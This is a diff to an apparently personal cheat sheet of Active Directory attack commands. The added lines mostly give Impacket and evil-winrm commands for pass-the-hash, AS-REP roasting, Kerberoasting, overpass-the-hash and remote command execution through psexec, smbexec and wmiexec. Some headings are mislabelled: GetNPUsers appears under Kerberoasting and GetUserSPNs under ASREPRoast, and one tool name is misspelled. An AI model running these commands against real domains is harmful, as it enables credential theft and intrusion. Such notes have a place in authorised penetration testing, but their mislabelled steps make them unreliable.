@@ -16,6 +16,10 @@
 
 ## General Tools  
 [Impacket](https://github.com/SecureAuthCorp/impacket)   
+
+    apt install impacket-scripts  
+    /usr/share/doc/python3-impacket/examples  
+    
 [evil-winrm](https://github.com/nubix/evil-winrm)    
 [ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   
 
@@ -39,7 +43,31 @@ If you have creds for the backup account for domain controller: can dump all has
     
 Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    
 
-    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]        
+    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]    
+    
+    ## Check for Kerberoasting: 
+
+- GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john
+
+## GetUserSPNs
+
+ASREPRoast:
+- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+- impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+Kerberoasting: 
+- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 
+
+Overpass The Hash/Pass The Key (PTK):
+- python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+- python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+- python3 getTGT.py <domain_name>/<user_name>:[password]
+
+## Using TGT key to excute remote commands from the following impacket scripts:
+
+- python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+- python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+- python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 
 
 ## LDAP (Port 636)
